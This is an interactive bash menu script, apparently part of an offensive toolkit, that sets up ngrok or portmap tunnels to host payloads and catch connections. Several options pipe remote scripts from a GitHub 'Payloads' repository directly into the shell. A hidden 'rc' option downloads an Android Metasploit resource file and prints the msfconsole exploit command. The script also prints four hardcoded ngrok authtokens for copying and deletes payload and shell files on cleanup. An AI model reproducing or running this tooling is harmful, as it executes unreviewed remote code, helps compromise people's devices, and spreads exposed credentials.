
#!/bin/bash
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'

echo -e "
      ${IGreen}┌═══════════─┐		
      │▶${clear}${IYellow} SERVER FX${clear}${IGreen} │
      └─┬═════════─┘
  ┌─────┘
  ├──${IGreen} [${IYellow}1${clear}${IGreen}] ${Green}ngrok http
  ${IGreen}├── [${IYellow}2${clear}${IGreen}] ${Green}ntrok tcp
  ${IGreen}├── [${IYellow}3${clear}${IGreen}] ${Green}portmap tcp
  ${IGreen}├── [${IYellow}4${clear}${IGreen}] ${Green}check
  ${IGreen}├── [${IYellow}5${clear}${IGreen}] ${Green}clean
  ${IGreen}└─▶ [${IYellow}0${clear}${IGreen}] ${Green}exit"
echo  
echo -en "      ${Green}[${IGreen}ENTER HERE${clear}${Green}]${Green}${clear}${IGreen} ▶ ${IYellow} "
read stn
echo
case $stn in

rc)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Generating RCfile in PWD...${clear}"
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Please wait...${clear}"
sleep 2
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Generated...${clear}"
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Edit command:${IGreen} nano export.rc ${clear}"
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Exploit command:${IGreen} msfconsole -q -r export.rc... ${clear}"
curl -L -o $PWD/export.rc https://raw.githubusercontent.com/efxtv/Payloads/main/android/export.rc -s;;


authtoken)
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1tebxIB0maaFOCIBo1WmpYo0zGW_3KtM2gXefMR79HBcnGwwM ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1bmvO96MSDn7uOGRtB4GWmwoBTc_27GY17KjXZqMPNLEhAYnp ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1dLfazAyroRPboegbwh3M7x9Hc8_7Q8wNUYKAxSt5rqXbUwKD ${clear}"
echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1u7zpuJX1TvWK1MrDvi0fGDHN2G_61AgB79hTep6E5wqaroNd ${clear}"
echo -en "[${Green}✔${clear}] ${Green}Please enter your authtoken : ${clear}"
read autho
$HOME/ngrok authtoken $autho 1>/dev/null
echo -e "[${Green}✔${clear}] ${Green}Ngrok fixed... try again : ${clear}"
;;

1)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Your pressed ngrok http..${clear}"
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/server-ngrok-http.sh);;
  
2)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Your pressed ntrok tcp..${clear}"
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/server-ngrok-tcp.sh);;
  
3)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}You pressed portmap tcp..${clear}"
source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/portmap-tcp.sh);;
4)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}You pressed check..${clear}"
phpo()
{
cphp=$(which php|grep -o php)
if [ "$cphp" == "php" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}PHP is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}PHP is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}

wgeto()
{
cphp=$(which wget|grep -o wget)
if [ "$cphp" == "wget" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Wget is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Wget is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}

zipo()
{
czip=$(which zip|grep -o zip)
if [ "$czip" == "zip" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Zip is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Zip is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Checking for dependency..${clear}"
unzipo()
{
cunzip=$(which unzip|grep -o unzip)
if [ "$cunzip" == "unzip" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Unzip is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Unzip is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}

curlo()
{
ccurl=$(which curl|grep -o curl)
if [ "$ccurl" == "curl" ]; then
echo -e "\t${IGreen}├──${clear} ${Green}Curl is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Curl is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}
jqo()
{
cjq=$(which jq|grep -o jq)
if [ "$cjq" == "jq" ]; then
echo -e "\t${IGreen}└──${clear} ${Green}Jq is installed  ${clear}"
else
echo -e "\t${IGreen}├──${clear} ${Red}Jq is not installed  ${clear}"
echo -e "\t${IGreen}└──${clear} ${Red}Install and try again${clear}"
exit
fi
}
phpo
sleep 1
wgeto
sleep 1
zipo
sleep 1
unzipo
sleep 1
curlo
sleep 1
jqo;;
#4 ends here
5)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}You pressed clean..${clear}"
echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Delete index.html and payloads? enter to confirm :${clear}"
read l
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Processing..${clear}"
sleep 3
pkill php
pkill ngrok
rm -rf index.html payload* shell*;;
0)
echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Thank you :)${clear}"
echo
;;
*)
  echo -e " $(tput setaf 2)[$(tput sgr0)$(tput setaf 1)x$(tput sgr0)$(tput setaf 2)]$(tput sgr0) ${Red}No no no !! Wrong input";;
esac
